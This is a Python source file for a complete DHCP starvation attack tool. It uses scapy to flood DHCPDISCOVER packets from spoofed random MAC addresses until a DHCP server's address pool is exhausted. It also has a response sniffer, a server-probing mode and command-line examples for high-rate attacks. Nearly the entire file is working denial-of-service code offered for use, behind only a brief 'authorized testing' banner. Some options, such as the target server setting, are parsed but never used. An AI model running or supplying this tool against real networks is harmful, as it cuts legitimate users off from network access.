#!/usr/bin/env python3
"""
DHCP Starvation Attack Tool
A comprehensive utility for performing DHCP starvation attacks in controlled
environments. Demonstrates DHCP exhaustion by flooding DHCPDISCOVER packets
with fake MAC addresses.
"""

import argparse
import sys
import os
import time
import threading
import logging
import random
import socket
import struct
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from collections import defaultdict
import signal

# Try importing scapy with fallback message
try:
    from scapy.all import *
    from scapy.layers.dhcp import DHCP, BOOTP
    from scapy.layers.inet import IP, UDP
    from scapy.layers.l2 import Ether
    from scapy.sendrecv import sendp, sniff
    from scapy.error import Scapy_Exception
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()  # Initialize colorama for Windows support
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False

class DHCPStarvationAttack:
    """
    Main class for DHCP starvation attack
    Floods DHCP servers with DISCOVER packets using fake MAC addresses
    """
    
    # DHCP message types
    DHCP_DISCOVER = 1
    DHCP_OFFER = 2
    DHCP_REQUEST = 3
    DHCP_DECLINE = 4
    DHCP_ACK = 5
    DHCP_NAK = 6
    DHCP_RELEASE = 7
    DHCP_INFORM = 8
    
    # DHCP options
    DHCP_OPTIONS = {
        'subnet_mask': 1,
        'router': 3,
        'dns_server': 6,
        'hostname': 12,
        'domain_name': 15,
        'requested_ip': 50,
        'lease_time': 51,
        'message_type': 53,
        'server_id': 54,
        'parameter_list': 55,
        'renewal_time': 58,
        'rebinding_time': 59,
        'vendor_class': 60,
        'client_id': 61,
        'end': 255
    }
    
    # DHCP port
    DHCP_SERVER_PORT = 67
    DHCP_CLIENT_PORT = 68
    
    def __init__(self, interface: str = None, target_server: str = None,
                 mac_prefix: str = None, rate: int = 10, 
                 timeout: int = 0, verbose: bool = False,
                 random_macs: bool = True, max_leases: int = 1000):
        """
        Initialize DHCP starvation attack
        
        Args:
            interface: Network interface to use
            target_server: Specific DHCP server IP (None for broadcast)
            mac_prefix: MAC prefix for generated addresses
            rate: Packets per second
            timeout: Attack duration in seconds (0 = unlimited)
            verbose: Enable verbose output
            random_macs: Use completely random MACs
            max_leases: Maximum number of leases to exhaust
        """
        if not SCAPY_AVAILABLE:
            raise ImportError(
                "scapy module is required. Install with: pip install scapy"
            )
        
        self.interface = interface or self.get_default_interface()
        self.target_server = target_server
        self.mac_prefix = mac_prefix or "02:00:00"
        self.rate = rate
        self.timeout = timeout
        self.verbose = verbose
        self.random_macs = random_macs
        self.max_leases = max_leases
        
        # Statistics and state
        self.stats = {
            'packets_sent': 0,
            'offers_received': 0,
            'acks_received': 0,
            'naks_received': 0,
            'leases_exhausted': 0,
            'start_time': None,
            'macs_used': set()
        }
        
        self.lock = threading.Lock()
        self.running = False
        self.attack_thread = None
        self.sniffer_thread = None
        
        # MAC address tracking
        self.oui_prefixes = self.load_oui_prefixes()
        
        # Setup logging
        self.setup_logging()
        
        # Validate network setup
        self.validate_network()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('DHCPStarvation')
        
        # Remove existing handlers
        self.logger.handlers.clear()
        
        # Create console handler
        handler = logging.StreamHandler()
        
        # Set format based on colorama availability
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        
        # Set log level
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def get_default_interface(self) -> str:
        """Get default network interface"""
        if NETIFACES_AVAILABLE:
            try:
                gateway = netifaces.gateways()['default'][netifaces.AF_INET]
                return gateway[1]
            except Exception:
                pass
        
        # Fallback to scapy
        try:
            return conf.iface
        except Exception:
            return 'eth0'
    
    def validate_network(self):
        """Validate network configuration and permissions"""
        # Check if running as root (required for raw sockets)
        if os.geteuid() != 0:
            self.logger.error("This script requires root privileges for packet injection")
            self.logger.error("Please run with: sudo python3 dhcp_starvation.py")
            sys.exit(1)
        
        # Check interface
        try:
            test_packet = Ether()/IP(dst="8.8.8.8")/UDP()/DNS()
            sendp(test_packet, iface=self.interface, verbose=0, count=1, timeout=1)
            self.logger.info(f"[+] Interface {self.interface} is working")
        except Exception as e:
            self.logger.error(f"[-] Interface {self.interface} error: {e}")
            sys.exit(1)
    
    def load_oui_prefixes(self) -> List[str]:
        """
        Load common OUI prefixes for realistic MAC generation
        
        Returns:
            List of OUI prefixes
        """
        # Common OUI prefixes (first 3 bytes of MAC)
        return [
            "00:11:22", "00:1A:2B", "00:1B:44", "00:1C:BF", "00:1D:60",
            "00:1E:68", "00:1F:29", "00:20:18", "00:21:5A", "00:22:48",
            "00:23:54", "00:24:2B", "00:25:22", "00:26:5E", "00:27:13",
            "00:50:56", "00:0C:29", "00:15:5D", "00:50:56", "00:05:69",
            "08:00:27", "3C:97:0E", "44:45:53", "54:52:00", "A0:36:9F"
        ]
    
    def generate_mac(self) -> str:
        """
        Generate a MAC address
        
        Returns:
            MAC address string
        """
        while True:
            if self.random_macs:
                # Completely random MAC
                mac = [random.randint(0x00, 0xFF) for _ in range(6)]
                # Ensure unicast and locally administered
                mac[0] = (mac[0] & 0xFE) | 0x02
                mac_str = ":".join(f"{b:02x}" for b in mac)
            else:
                # Use prefix + random suffix
                prefix = self.mac_prefix
                suffix = ":".join(f"{random.randint(0x00, 0xFF):02x}" for _ in range(3))
                mac_str = f"{prefix}:{suffix}"
            
            # Avoid duplicates
            if mac_str not in self.stats['macs_used']:
                self.stats['macs_used'].add(mac_str)
                return mac_str
    
    def create_dhcp_discover(self, mac: str, hostname: str = None, 
                             requested_ip: str = None) -> Packet:
        """
        Create DHCP DISCOVER packet
        
        Args:
            mac: Client MAC address
            hostname: Client hostname (optional)
            requested_ip: Requested IP address (optional)
        
        Returns:
            DHCP DISCOVER packet
        """
        # Convert MAC string to bytes
        mac_bytes = bytes.fromhex(mac.replace(':', ''))
        
        # Create DHCP options
        options = [
            ('message-type', 'discover'),
            ('client_id', mac_bytes),
            ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252])
        ]
        
        if hostname:
            options.append(('hostname', hostname))
        
        if requested_ip:
            options.append(('requested_addr', requested_ip))
        
        options.append('end')
        
        # Build packet
        ether = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')
        
        ip = IP(src='0.0.0.0', dst='255.255.255.255')
        
        udp = UDP(sport=self.DHCP_CLIENT_PORT, dport=self.DHCP_SERVER_PORT)
        
        bootp = BOOTP(
            chaddr=mac_bytes,
            ciaddr='0.0.0.0',
            xid=random.randint(1, 0xFFFFFFFF),
            flags=0x8000  # Broadcast flag
        )
        
        dhcp = DHCP(options=options)
        
        return ether/ip/udp/bootp/dhcp
    
    def create_dhcp_request(self, mac: str, server_ip: str, offered_ip: str,
                           xid: int) -> Packet:
        """
        Create DHCP REQUEST packet (for verification)
        
        Args:
            mac: Client MAC address
            server_ip: DHCP server IP
            offered_ip: Offered IP address
            xid: Transaction ID from OFFER
        
        Returns:
            DHCP REQUEST packet
        """
        mac_bytes = bytes.fromhex(mac.replace(':', ''))
        
        options = [
            ('message-type', 'request'),
            ('client_id', mac_bytes),
            ('server_id', server_ip),
            ('requested_addr', offered_ip),
            ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
            'end'
        ]
        
        ether = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')
        ip = IP(src='0.0.0.0', dst='255.255.255.255')
        udp = UDP(sport=self.DHCP_CLIENT_PORT, dport=self.DHCP_SERVER_PORT)
        bootp = BOOTP(
            chaddr=mac_bytes,
            ciaddr='0.0.0.0',
            xid=xid,
            flags=0x8000
        )
        dhcp = DHCP(options=options)
        
        return ether/ip/udp/bootp/dhcp
    
    def dhcp_offer_handler(self, packet):
        """
        Handle DHCP OFFER packets
        
        Args:
            packet: Captured packet
        """
        try:
            if packet.haslayer(DHCP) and packet.haslayer(BOOTP):
                dhcp_options = packet[DHCP].options
                
                # Check if it's an OFFER
                for opt in dhcp_options:
                    if isinstance(opt, tuple) and opt[0] == 'message-type':
                        if opt[1] == 2:  # OFFER
                            with self.lock:
                                self.stats['offers_received'] += 1
                            
                            # Extract info
                            client_mac = packet[Ether].dst
                            offered_ip = packet[BOOTP].yiaddr
                            server_ip = packet[IP].src
                            xid = packet[BOOTP].xid
                            
                            if self.verbose:
                                self.logger.info(
                                    f"[*] OFFER: MAC={client_mac} IP={offered_ip} Server={server_ip}"
                                )
                            
                            # Optionally send REQUEST to verify
                            if self.verbose:
                                request = self.create_dhcp_request(
                                    client_mac, server_ip, offered_ip, xid
                                )
                                sendp(request, iface=self.interface, verbose=0)
                                
        except Exception as e:
            self.logger.debug(f"Error handling OFFER: {e}")
    
    def dhcp_ack_handler(self, packet):
        """
        Handle DHCP ACK packets
        
        Args:
            packet: Captured packet
        """
        try:
            if packet.haslayer(DHCP) and packet.haslayer(BOOTP):
                dhcp_options = packet[DHCP].options
                
                # Check if it's an ACK
                for opt in dhcp_options:
                    if isinstance(opt, tuple) and opt[0] == 'message-type':
                        if opt[1] == 5:  # ACK
                            with self.lock:
                                self.stats['acks_received'] += 1
                            
                            if self.verbose:
                                self.logger.info(f"[+] ACK received")
                        
                        elif opt[1] == 6:  # NAK
                            with self.lock:
                                self.stats['naks_received'] += 1
                            
                            if self.verbose:
                                self.logger.warning(f"[-] NAK received")
                                
        except Exception as e:
            self.logger.debug(f"Error handling ACK/NAK: {e}")
    
    def start_sniffer(self):
        """Start packet sniffer to monitor DHCP responses"""
        self.logger.info(f"[*] Starting DHCP response sniffer")
        
        # BPF filter for DHCP responses
        bpf_filter = f"udp and port {self.DHCP_SERVER_PORT}"
        
        try:
            sniff(
                iface=self.interface,
                filter=bpf_filter,
                prn=lambda p: self.dhcp_offer_handler(p) or self.dhcp_ack_handler(p),
                store=False,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            self.logger.error(f"[-] Sniffer error: {e}")
    
    def attack_worker(self):
        """Main attack worker thread"""
        self.logger.info(f"[*] Starting DHCP starvation attack")
        self.logger.info(f"[*] Rate: {self.rate} packets/sec")
        self.logger.info(f"[*] Max leases: {self.max_leases}")
        
        packet_interval = 1.0 / self.rate
        
        while self.running and self.stats['packets_sent'] < self.max_leases:
            try:
                # Generate random MAC
                mac = self.generate_mac()
                
                # Create DHCP DISCOVER packet
                hostname = f"host-{random.randint(1000, 9999)}"
                packet = self.create_dhcp_discover(mac, hostname)
                
                # Send packet
                sendp(packet, iface=self.interface, verbose=0)
                
                with self.lock:
                    self.stats['packets_sent'] += 1
                
                if self.stats['packets_sent'] % 10 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    self.logger.info(
                        f"[*] Packets sent: {self.stats['packets_sent']}/{self.max_leases} "
                        f"| Offers: {self.stats['offers_received']} "
                        f"| Rate: {self.stats['packets_sent']/elapsed:.1f}/s"
                    )
                
                # Rate limiting
                time.sleep(packet_interval)
                
            except Exception as e:
                self.logger.error(f"[-] Attack error: {e}")
                time.sleep(1)
    
    def start_attack(self):
        """Start the DHCP starvation attack"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        self.logger.info(f"\n{'='*60}")
        self.logger.info(f"DHCP Starvation Attack Started")
        self.logger.info(f"{'='*60}")
        self.logger.info(f"Interface: {self.interface}")
        self.logger.info(f"Target Server: {self.target_server or 'Broadcast'}")
        self.logger.info(f"Rate: {self.rate} packets/sec")
        self.logger.info(f"Max Leases: {self.max_leases}")
        self.logger.info(f"{'='*60}\n")
        
        # Start sniffer thread
        self.sniffer_thread = threading.Thread(target=self.start_sniffer)
        self.sniffer_thread.daemon = True
        self.sniffer_thread.start()
        
        # Start attack thread
        self.attack_thread = threading.Thread(target=self.attack_worker)
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Run for specified timeout
        if self.timeout > 0:
            self.logger.info(f"[*] Attack will run for {self.timeout} seconds")
            time.sleep(self.timeout)
            self.stop_attack()
        else:
            # Wait for attack to complete
            self.attack_thread.join()
    
    def stop_attack(self):
        """Stop the DHCP starvation attack"""
        self.logger.info("\n[*] Stopping attack...")
        self.running = False
        
        # Wait for threads to finish
        if self.attack_thread:
            self.attack_thread.join(timeout=5)
        
        if self.sniffer_thread:
            self.sniffer_thread.join(timeout=5)
        
        # Display statistics
        self.show_statistics()
    
    def show_statistics(self):
        """Display attack statistics"""
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        
        print(f"\n{'='*60}")
        print(f"Attack Statistics")
        print(f"{'='*60}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Packets sent: {self.stats['packets_sent']:,}")
        print(f"Offers received: {self.stats['offers_received']:,}")
        print(f"ACKs received: {self.stats['acks_received']:,}")
        print(f"NAKs received: {self.stats['naks_received']:,}")
        print(f"Unique MACs used: {len(self.stats['macs_used']):,}")
        print(f"Success rate: {(self.stats['offers_received']/max(1,self.stats['packets_sent']))*100:.1f}%")
        print(f"{'='*60}\n")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        self.logger.info("\n[!] Interrupt received, stopping attack...")
        self.stop_attack()
        sys.exit(0)
    
    def check_dhcp_range(self, server_ip: str = None) -> Dict:
        """
        Check DHCP server configuration and range
        
        Args:
            server_ip: Specific DHCP server to query
        
        Returns:
            Dictionary with DHCP server information
        """
        info = {
            'server_ip': server_ip or 'Unknown',
            'subnet': None,
            'router': None,
            'dns': [],
            'lease_time': None,
            'ip_range': None
        }
        
        try:
            # Send a legitimate DISCOVER to get OFFER
            mac = self.generate_mac()
            discover = self.create_dhcp_discover(mac)
            
            response = srp1(
                discover,
                iface=self.interface,
                timeout=5,
                verbose=0
            )
            
            if response and response.haslayer(DHCP) and response.haslayer(BOOTP):
                info['server_ip'] = response[IP].src
                info['offered_ip'] = response[BOOTP].yiaddr
                
                # Parse DHCP options
                for opt in response[DHCP].options:
                    if isinstance(opt, tuple):
                        if opt[0] == 'subnet_mask':
                            info['subnet_mask'] = opt[1]
                        elif opt[0] == 'router':
                            info['router'] = opt[1]
                        elif opt[0] == 'dns_server':
                            info['dns'] = opt[1]
                        elif opt[0] == 'lease_time':
                            info['lease_time'] = opt[1]
                
                self.logger.info(f"[+] DHCP server found: {info['server_ip']}")
                self.logger.info(f"[+] Offered IP: {info['offered_ip']}")
                self.logger.info(f"[+] Subnet mask: {info.get('subnet_mask', 'Unknown')}")
                self.logger.info(f"[+] Router: {info.get('router', 'Unknown')}")
                self.logger.info(f"[+] Lease time: {info.get('lease_time', 'Unknown')} seconds")
                
        except Exception as e:
            self.logger.error(f"[-] Failed to query DHCP server: {e}")
        
        return info

def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    DHCP Starvation Attack Tool
    For authorized security testing and education only
    WARNING: This tool can exhaust DHCP pools and disrupt networks
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)

def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='DHCP Starvation Attack Tool - Exhaust DHCP server IP pools',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic DHCP starvation (1000 leases)
  python dhcp_starvation.py -i eth0 --max-leases 1000
  
  # High-speed attack (50 packets/sec)
  python dhcp_starvation.py -i eth0 --rate 50 --max-leases 5000
  
  # Time-limited attack (60 seconds)
  python dhcp_starvation.py -i eth0 --rate 20 --timeout 60
  
  # With specific MAC prefix
  python dhcp_starvation.py -i eth0 --mac-prefix "00:11:22" --max-leases 500
  
  # Check DHCP server first
  python dhcp_starvation.py -i eth0 --check
  
  # Target specific DHCP server
  python dhcp_starvation.py -i eth0 --server 192.168.1.1 --max-leases 1000
  
  # Verbose mode with response monitoring
  python dhcp_starvation.py -i eth0 --max-leases 500 -v
        """
    )
    
    # Network arguments
    parser.add_argument('-i', '--interface', help='Network interface to use')
    parser.add_argument('--server', help='Specific DHCP server IP (omit for broadcast)')
    parser.add_argument('--mac-prefix', default='02:00:00',
                       help='MAC prefix for generated addresses (default: 02:00:00)')
    parser.add_argument('--rate', type=int, default=10,
                       help='Packets per second (default: 10)')
    parser.add_argument('--max-leases', type=int, default=1000,
                       help='Maximum number of leases to exhaust (default: 1000)')
    parser.add_argument('--timeout', type=int, default=0,
                       help='Attack duration in seconds (0 = until max-leases)')
    
    # Operation modes
    parser.add_argument('--check', action='store_true',
                       help='Check DHCP server configuration first')
    parser.add_argument('--no-sniff', action='store_true',
                       help='Disable response sniffing')
    
    # Output options
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    parser.add_argument('--stats-interval', type=int, default=10,
                       help='Statistics display interval in packets (default: 10)')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Check if scapy is available
    if not SCAPY_AVAILABLE:
        print("[!] scapy module is required. Install with: pip install scapy")
        print("    On Debian/Ubuntu: sudo apt install python3-scapy")
        sys.exit(1)
    
    try:
        # Initialize attack
        attack = DHCPStarvationAttack(
            interface=args.interface,
            target_server=args.server,
            mac_prefix=args.mac_prefix,
            rate=args.rate,
            timeout=args.timeout,
            verbose=args.verbose,
            random_macs=True,
            max_leases=args.max_leases
        )
        
        # Check DHCP server if requested
        if args.check:
            print("\n[*] Checking DHCP server configuration...")
            info = attack.check_dhcp_range(args.server)
            
            # Ask for confirmation before attacking
            if info.get('server_ip'):
                response = input(f"\n[*] Attack DHCP server {info['server_ip']}? (y/N): ")
                if response.lower() != 'y':
                    print("[*] Exiting")
                    sys.exit(0)
        
        # Start attack
        attack.start_attack()
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
